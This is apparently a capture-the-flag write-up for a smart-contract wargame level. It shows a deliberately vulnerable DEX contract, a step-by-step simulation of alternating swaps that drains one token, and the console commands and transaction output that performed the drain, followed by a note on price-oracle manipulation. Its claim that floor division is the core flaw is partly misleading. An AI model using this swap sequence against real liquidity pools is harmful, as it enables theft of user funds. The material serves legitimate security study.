# 22 - Dex

## Challenge

The goal of this level is for you to hack the basic [DEX](https://en.wikipedia.org/wiki/Decentralized_exchange) contract below and steal the funds by price manipulation. You will start with 10 tokens of `token1` and 10 of `token2`. The DEX contract starts with 100 of each token.

## Quick Note

Normally, when you make a swap with an ERC20 token, you have to `approve` the contract to spend your tokens for you. To keep with the syntax of the game, we've just added the `approve` method to the contract itself. So feel free to use `contract.approve(contract.address, <uint amount>)` instead of calling the tokens directly, and it will automatically approve spending the two tokens by the desired amount. Feel free to ignore the `SwappableToken` contract otherwise.

Things that might help:

- How is the price of the token calculated?
- How does the `swap` method work?
- How do you `approve` a transaction of an ERC20?

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts-08/access/Ownable.sol';

contract Dex is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

## Summary

A long piece of code is provided. `SwappableToken` basically provides an `approve` interface to be used by `Dex.approve`, so we can ignore that.

The `Dex` contract has a `swap` method that swaps `token1` for `token2` and vice versa. The price is calculated by the `getSwapPrice` method, which is the ratio of the two token balances.

```js
function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
}
```

The vulnerability of `getSwapPrice` is related with the division. In Solidity, division is floored. This means that after the swap, one party will have more tokens that it should have, and the other party will have less. We can simulate `swap` between player and contract as follows:

```
Dex token 1: 100
Dex token 2: 100
Usr token 1: 10
Usr token 2: 10
```

The first time we call swap token 1 for token 2 (means player token 1 becomes 0), the swap price is just `10 * 100 / 100 = 10`.

```
Dex token 1: 110 (+10)
Dex token 2: 90  (-10)
Usr token 1: 0   (-10)
Usr token 2: 20  (+10)
```

Now if we swap token 2 for token 1 (`to` is token 1), the swap price is `20 * 110 / 90 = 24`. Here we can observe a rounding already.

```
Dex token 1: 86  (-24)
Dex token 2: 110 (+20)
Usr token 1: 24  (+24)
Usr token 2: 0   (-20)
```

Keep doing this:

```
Dex token 1: 110  (+24)
Dex token 2: 80   (-30)
Usr token 1: 0    (-24)
Usr token 2: 30   (+30)

Dex token 1: 69   (-41)
Dex token 2: 110  (+30)
Usr token 1: 41   (+41)
Usr token 2: 0    (-30)

Dex token 1: 110  (+41)
Dex token 2: 45   (-65)
Usr token 1: 0    (-41)
Usr token 2: 65   (+65)
```

Since `65 * 110 / 45 = 158 > 100`, we can swap part of token 2 now to get all 110 token 1. `110 * 45 / 110 = 45`, so we just need 45 token 2.

```
Dex token 1: 0   (-110)
Dex token 2: 90  (+45)
Usr token 1: 110 (+110)
Usr token 2: 20  (-45)
```

Done.

## Walkthrough

First approve, then swap as mentioned above until drained token 1.

```js
> await contract.approve(contract.address, 500)
{tx: '0x58a10396dcd83987f81be0db19c38e9131e7449f75c22891990a4662608239ce', receipt: {…}, logs: Array(0)}
> t1 = await contract.token1()
'0x29af11aF0d67445dCfFFEa4792313c9BC6e7A096'
> t2 = await contract.token2()
'0x56B0F59855355DF9922c53e5305c3b1f0c34b78f'
> await contract.swap(t1, t2, 10)
{tx: '0x3359d4b489315b8c0c398ba853eebaafd56472b1e6eb445778ee8ac4bc02a481', receipt: {…}, logs: Array(0)}
> await contract.swap(t2, t1, 20)
{tx: '0xc21ed486e7d9fa881380b4242bd7cc90692e3ebac4f1fc362e0417631624d848', receipt: {…}, logs: Array(0)}
> await contract.swap(t1, t2, 24)
{tx: '0x85063ff107458ea676f96599c1d27ef23fcc422b743474bc1a0c7de2c32bbebb', receipt: {…}, logs: Array(0)}
> await contract.swap(t2, t1, 30)
{tx: '0x6b66431881edf445e4fc7c1d6c1d13210eba9ef1b6837cdfeb9ccd12e9f3bafc', receipt: {…}, logs: Array(0)}
> await contract.swap(t1, t2, 41)
{tx: '0x212c5fe94d41069537b7f10ba352de23da9d0038f80437575de27969e9a68ba8', receipt: {…}, logs: Array(0)}
> await contract.swap(t2, t1, 45)
{tx: '0x09e1fc084769423a66bbcbe605ae4a3ee738170873f13e4a9e28ff3898224cc9', receipt: {…}, logs: Array(0)}
> await contract.balanceOf(t1, instance).then(v => v.toString())
'0'
```

Finally, submit the instance to pass the level.

## Afterword

The integer math portion aside, getting prices or any sort of data from any single source is a massive attack vector in smart contracts.

You can clearly see from this example, that someone with a lot of capital could manipulate the price in one fell swoop, and cause any applications relying on it to use the the wrong price.

The exchange itself is decentralized, but the price of the asset is centralized, since it comes from 1 dex. However, if we were to consider tokens that represent actual assets rather than fictitious ones, most of them would have exchange pairs in several dexes and networks. This would decrease the effect on the asset's price in case a specific dex is targeted by an attack like this.